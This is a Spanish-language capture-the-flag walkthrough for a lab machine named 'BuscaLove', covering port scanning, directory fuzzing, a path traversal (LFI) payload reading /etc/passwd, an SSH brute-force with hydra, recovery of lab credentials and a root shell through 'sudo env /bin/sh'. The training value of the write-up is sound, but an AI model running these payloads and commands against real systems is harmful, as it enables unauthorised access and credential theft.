Maquina: BuscaLove

Autor: Prendelo

Dificultad: Facil

![Captura de pantalla 2024-11-26 205848](https://github.com/user-attachments/assets/e6e28623-9979-46f1-b763-6e6b34f436aa)

ping 172.18.0.2 -c 1 

![Captura de pantalla 2024-11-29 193110](https://github.com/user-attachments/assets/7fddc885-21fe-4b8f-a553-c41af261a116)

sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.18.0.2 -vvv 

![Captura de pantalla 2024-11-29 193152](https://github.com/user-attachments/assets/1c708dd3-fc98-411b-9b9d-b38c592b77f6)

Vamos a la web y encontramos la pagina de apache2.

Realizamos un escaneo de directorios y encontramos un directorio llamado WordPress.

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.18.0.2

![Captura de pantalla 2024-11-29 193301](https://github.com/user-attachments/assets/72027e7e-ae6e-4662-8716-966c77e909c2)

Al dirigirnos a esa dirección podemos ver que se trata de una página muy simple en la cual los enlaces no redireccionan a ninguna página.

Realizamos un escaneo para ver si encontramos algún archivo o carpeta, pero no obtenemos nada, solo sabemos que el index es index.php.

gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://172.18.0.2

![Captura de pantalla 2024-11-29 193419](https://github.com/user-attachments/assets/ff82158f-71de-44f6-94c0-3b25b523062a)

Probamos a realizar fuzzing para ver si es posible listar algún archivo. Como no sabemos que archivo encontrar nos apoyaremos del passwd y si lo encuentra podemos también saber que existe un posible LFI

Enviamos el comando y podemos observar que el parámetro es love.

wfuzz -c --hc=404,115 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://172.18.0.2/wordpress/index.php?FUZZ=../../../../../etc/passwd | grep -v 1040

![Captura de pantalla 2024-11-29 193541](https://github.com/user-attachments/assets/3db39920-92d6-4568-ab37-105b8dc76810)

Si ingresamos la URL en el navegador y vamos al view-source podemos observar con mayor facilidad el passwd.

view-source:http://172.18.0.2/wordpress/index.php?love=../../../../etc/passwd

No solo observamos que es posible un LFI, sino que también tenemos dos usuarios, rosa y pedro,

![Captura de pantalla 2024-11-29 193615](https://github.com/user-attachments/assets/ef8b447d-fbc7-4960-bae7-f3f38dca4771)

Aplicamos fureza bruta con hydra

hydra -l rosa -P /home/ankb/Documents/rockyou.txt ssh://172.18.0.2 -s 22 -t 64

encontramos en password: lovebug

![Captura de pantalla 2024-11-29 194033](https://github.com/user-attachments/assets/5bcb3e93-40ed-4ae2-ad82-17627db3011b)

Nos metemos por ssh con los credenciales encontrados

ssh rosa@172.18.0.2

lovebug

![Captura de pantalla 2024-11-29 194107](https://github.com/user-attachments/assets/58ea3605-b0d1-4709-a35a-253560b43bab)

sudo -l

![Captura de pantalla 2024-11-29 194120](https://github.com/user-attachments/assets/835e0ab1-4676-40d5-8946-09f60d837bc1)

Tenemos dos binarios que nos pueden ser de utilidad, en el caso de ls nos permite listar archivos como root y usando cat de esta manera podemos leerlos.

sudo /usr/bin/ls /root

Haciendo uso de cat procedemos a leer el archivo y observamos que es un archivo al parecer en formato hexadecimal.

sudo /usr/bin/cat /root/secret.txt

![Captura de pantalla 2024-11-29 194359](https://github.com/user-attachments/assets/1e8dd019-15b5-400c-b170-c152b8e5d7b1)

Copiamos este texto cifrado en la página de CyberChef y podemos observar que primero el texto estaba en formato Hexadecimal y luego en base 32, pero transformando ambos podemos observar que el texto era noacertarasosi.

![Captura de pantalla 2024-11-29 195219](https://github.com/user-attachments/assets/66b6fe03-5b5f-47b6-9f95-e7931751a5cb)

Pobamos las credenciales encontradas con el usuario pedro.

su pedro
noacertarasosi

![Captura de pantalla 2024-11-29 195256](https://github.com/user-attachments/assets/46b32728-8953-47d9-8cff-6ea67a5a7f4f)

sudo -l

![Captura de pantalla 2024-11-29 195311](https://github.com/user-attachments/assets/8d49f681-cdc0-411a-b3b5-d170f84dec45)

sudo env /bin/sh

whoami

![Captura de pantalla 2024-11-29 195330](https://github.com/user-attachments/assets/51fe09ed-690f-4161-93a8-427156300637)



